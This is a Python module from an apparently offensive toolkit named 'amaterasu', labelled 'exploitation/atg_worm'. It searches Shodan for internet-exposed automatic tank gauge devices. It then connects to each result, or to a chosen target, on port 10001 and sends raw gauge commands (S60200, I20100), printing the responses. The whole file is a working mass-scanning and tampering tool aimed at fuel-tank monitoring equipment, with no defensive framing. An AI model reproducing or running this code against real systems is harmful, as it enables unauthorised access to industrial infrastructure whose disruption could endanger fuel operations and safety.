#!/usr/bin/env python3.7
#coding: utf-8
#Project amaterasu

import argparse
import cmd2
import requests
from lib.sqlconnection import *
from prettytable import from_db_cursor
from pwn import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_useShodan = set_subparsers.add_parser('shodan', help='shodan help')
parser_useShodan.add_argument('shodan', type=bool)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["target", "apis", "config", "banner"])

class ATGworm(cmd2.Cmd):
	prompt = 'amaterasu[exploitation/atg_worm]> '

	def __init__(self):
		shodan_test = SQLiteConnection().select_fetchall(SQLiteConnection().create_connection('amaterasu.db'), 'SELECT key FROM apis WHERE name == "shodan"')
		super().__init__()
		self.target = ''
		self.ips = []
		self.shodan = False
		if shodan_test == None:
			self.shodanAPIkey = ''
		else:
			self.shodanAPIkey = shodan_test

	def show(self, args):
		'''Shows something'''
		if args.show == 'banner':
			print('banner')

		if args.show == 'config':
			print(f'Target: {self.target}')

		if args.show == 'target':
			print(f'Target: {self.target}')

		if args.show == 'apis':
			print(from_db_cursor(SQLiteConnection().select_all_from_task(SQLiteConnection().create_connection('amaterasu.db'), 'apis')))

	def set_target(self, args):
		self.target = args.target
		print(f'Target set: {self.target}')

	def set_useShodan(self, args):
		self.shodan = args.shodan
		print(f'Use Shodan set: {self.shodan}')

	parser_target.set_defaults(func = set_target)
	parser_useShodan.set_defaults(func = set_useShodan)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_run(self, args):
		''' Runs the module.'''
		if self.shodan:
			requestShodan = requests.get(f'https://api.shodan.io/shodan/host/search?key={self.shodanAPIkey}&query=I20100')
			for match in requestShodan.json()["matches"]:
				self.ips.append(match["ip_str"])

			if self.ips != None:
				for ip in self.ips:
					try:
						remoteShodan = remote(ip, 10001)
						remoteShodan.send('\x01S60200\r\n')
						remoteShodan.send('\x01I20100\r\n')
						remoteShodan.recvuntil(' ', drop = True)
						response = remoteShodan.recv(4029)

						print(f'Response: {response}')
						remoteShodan.close()
					except Exception as e:
						print(f'Error: {e}')
						pass

		if self.target is not '':
			try:
				remoteTarget = remote(self.target, 10001)
				remoteTarget.send('\x01S60200\r\n')
				remoteTarget.send('\x01I20100\r\n')
				remoteTarget.recvuntil(' ', drop = True)
				response = remoteTarget.recv(4029)

				print(f'Response: {response}')
				remoteTarget.close()
			except Exception as e:
				print(f'Error: {e}')